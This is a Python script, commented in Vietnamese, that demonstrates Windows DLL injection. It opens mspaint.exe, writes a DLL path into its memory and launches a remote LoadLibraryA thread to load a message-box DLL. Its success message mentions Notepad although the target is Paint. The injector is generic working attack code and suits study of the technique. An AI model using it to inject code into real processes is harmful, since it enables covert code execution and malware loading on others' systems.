import os
import sys
import ctypes
from ctypes import wintypes

# ==================== HẰNG SỐ ====================
PROCESS_ALL_ACCESS = 0x001FFFFF
MEM_COMMIT  = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_READWRITE = 0x04
TH32CS_SNAPPROCESS = 0x00000002

# ==================== STRUCT ====================
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", wintypes.WCHAR * 260),
    ]

# ==================== KHAI BÁO API ====================
kernel32 = ctypes.windll.kernel32

kernel32.OpenProcess.restype = ctypes.c_void_p
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

kernel32.VirtualAllocEx.restype = ctypes.c_void_p
kernel32.VirtualAllocEx.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    wintypes.DWORD, wintypes.DWORD
]

kernel32.WriteProcessMemory.restype = wintypes.BOOL
kernel32.WriteProcessMemory.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_char_p,
    ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)
]

kernel32.GetModuleHandleA.restype = ctypes.c_void_p
kernel32.GetModuleHandleA.argtypes = [ctypes.c_char_p]

kernel32.GetProcAddress.restype = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]

kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, wintypes.DWORD]
kernel32.CloseHandle.argtypes = [ctypes.c_void_p]

kernel32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]

kernel32.Process32FirstW.restype = wintypes.BOOL
kernel32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32W)]

kernel32.Process32NextW.restype = wintypes.BOOL
kernel32.Process32NextW.argtypes = [ctypes.c_void_p, ctypes.POINTER(PROCESSENTRY32W)]

# ==================== HÀM TÌM PID ====================
def get_pid_by_name(proc_name):
    hSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    if kernel32.Process32FirstW(hSnap, ctypes.byref(pe32)):
        while True:
            if pe32.szExeFile.lower() == proc_name.lower():
                pid = pe32.th32ProcessID
                kernel32.CloseHandle(hSnap)
                return pid
            if not kernel32.Process32NextW(hSnap, ctypes.byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return 0

# Bước 1: Tìm tiến trình mục tiêu
target = "mspaint.exe"
pid = get_pid_by_name(target)
if not pid:
    print(f"[-] Không tìm thấy {target}!")
    sys.exit(1)
print(f"[+] Tìm thấy {target} - PID: {pid}")

# Lấy đường dẫn file messagebox.dll
dll_path = os.path.abspath("messagebox.dll")
if not os.path.exists(dll_path):
    print(f"[-] Không tìm thấy: {dll_path}")
    sys.exit(1)
dll_bytes = dll_path.encode('utf-8') + b'\x00'

# Bước 2: Mở tiến trình và cấp phát bộ nhớ
hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not hProcess:
    print(f"[-] OpenProcess thất bại. Lỗi: {kernel32.GetLastError()}")
    sys.exit(1)

addr = kernel32.VirtualAllocEx(hProcess, None, len(dll_bytes), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
if not addr:
    print(f"[-] VirtualAllocEx thất bại.")
    kernel32.CloseHandle(hProcess)
    sys.exit(1)

# Bước 3: Ghi đường dẫn DLL vào bộ nhớ
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(hProcess, addr, dll_bytes, len(dll_bytes), ctypes.byref(written))

# Bước 4: Phân giải LoadLibraryA và tạo luồng thực thi từ xa
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

thread_id = wintypes.DWORD(0)
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),
    ctypes.c_void_p(0),
    ctypes.c_size_t(0),
    ctypes.c_void_p(load_lib),
    ctypes.c_void_p(addr),
    wintypes.DWORD(0),
    ctypes.byref(thread_id)
)

if hThread:
    print(f"[+] Inject thành công! MessageBox sẽ hiển thị trên Notepad.")
    kernel32.WaitForSingleObject(hThread, 5000)
    kernel32.CloseHandle(hThread)
    kernel32.CloseHandle(hProcess)
else:
    print(f"[-] Inject thất bại. Lỗi: {kernel32.GetLastError()}")
    kernel32.CloseHandle(hProcess)
